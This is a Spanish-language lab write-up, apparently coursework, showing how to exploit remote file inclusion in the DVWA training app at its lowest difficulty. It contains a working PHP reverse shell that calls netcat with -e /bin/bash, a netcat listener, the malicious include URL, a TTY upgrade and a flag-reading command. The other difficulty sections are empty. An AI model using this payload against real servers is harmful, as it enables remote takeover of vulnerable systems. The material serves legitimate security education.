# RFI

Remote file inclusion (RFI) es una vulnerabilidad que permite a un atacante incluir archivos de un servidor remoto. Esto puede ser utilizado para incluir archivos PHP, que luego pueden ser utilizados para ejecutar código arbitrario en el servidor.

## Bajo

Para comenzar, podemos intentar lanzar un shell remoto escrito en PHP `php-reverse-shell.php` que se encuentra en nuestro servidor local y que previamente hemos creado con el siguiente contenido:

```php
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

A continuación, ponemos en escucha el puerto 4000 en nuestro servidor local para recibir la conexión del servidor remoto:

```bash
nc -lvnp 4000
```

Una vez puesto en escucha, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
```

Una vez incluido el archivo, el servidor remoto intentará conectarse al servidor local en el puerto 4000, y si todo ha ido bien, obtendremos una shell remota.
Una vez hayamos obtenida la shell remota, podemos intentar mejorar la TTY para poder interactuar con ella de una manera más cómoda, para ello ejecutamos el siguiente comando:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Una vez mejorada la TTY, podemos intentar leer el archivo `fi.php` utilizando cat:

```bash
cat DVWA/hackable/flags/fi.php
```

![rfi](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi.png)

## Medio

## Alto

## Imposible
